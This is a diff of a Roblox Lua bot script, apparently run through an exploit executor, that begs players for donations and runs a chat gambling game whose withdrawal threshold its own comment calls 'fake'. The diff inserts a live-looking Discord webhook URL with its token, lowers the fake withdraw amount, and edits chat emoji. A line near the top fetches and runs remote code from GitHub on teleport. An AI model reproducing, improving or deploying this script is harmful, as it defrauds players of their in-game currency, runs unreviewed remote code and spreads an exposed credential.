@@ -41,10 +41,10 @@ queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-T
 if not getgenv().settin then
 	getgenv().settin = {
 		['WebHook'] = {
-			['Webhook'] = "",
+			['Webhook'] = "https://discord.com/api/webhooks/1079128197205065778/9qwSdzplehya4xIYihB5c8WdhGW4gYwavjim4PYScUr--EWtxzofi_XeY75LnnhvtRXU",
 		},
 		['ServerHopDelay'] = 15, -- minutes, resets every donation
-		['MinimumWithdrawAmount'] = 1000, -- fake withdraw amount
+		['MinimumWithdrawAmount'] = 250, -- fake withdraw amount
 		['Beg'] = {
 			['Delay'] = 120,
 			['Messages'] = {
@@ -315,18 +315,18 @@ msgdone.OnClientEvent:Connect(function(msgdata)
 		return
 	end
 	if message == '.play' then
-		chat('💸 You need to specify an amount! | .play amount 💸')
+		chat('💸 You need to specify an amount! | .play [amount] 💸')
 		return
 	end
 	if string.match(message, '.play ') then
 		local slotValx = string.gsub(message, '.play ', '')
 		if not tonumber(slotValx) or tonumber(slotValx) < 0 then
-			chat('💸 Enter a valid amount! | .play amount 💸')
+			chat('💸 Enter a valid amount! | .play [amount] 💸')
 			return
 		end
 		local slotVal = tonumber(slotValx)
 		if bal == 0 then
-			chat('💸 Your balance is 0! You cannot play! 💸')
+			chat('😥 Your balance is 0! You cannot play! 😥')
 			return
 		end
 		if bal < slotVal then
@@ -341,16 +341,16 @@ msgdone.OnClientEvent:Connect(function(msgdata)
                   newBalance = 0
                 end
 		if newBalance > oldBalance then
-			chat('💸 You won! Your new balance is: ' .. newBalance .. ' 💸')
+			chat('🤑 You won! Your new balance is: ' .. newBalance .. ' 🤑')
 		elseif newBalance < oldBalance then
-			chat('💸 You lost! Your new balance is: ' .. newBalance .. ' 💸')
+			chat('😞 You lost! Your new balance is: ' .. newBalance .. ' 😞')
 		else
-			chat('💸 Your balance stays the same 💸')
+			chat('💎 Your balance stays the same 💎')
 		end
 		plrChatted:SetAttribute('Donated', newBalance)		
 	end
     if message == '.help' then
-        chat('.help | .withdraw | .play amount | .balance || Amount of bux you donate will be sent to your balance.')
+        chat('.help | .withdraw | .play [amount] | .balance || Amount of bux you donate will be sent to your balance.')
     end
     if message == '.withdraw' then
         if plrChatted:GetAttribute('Donated') < getgenv().settin.MinimumWithdrawAmount then
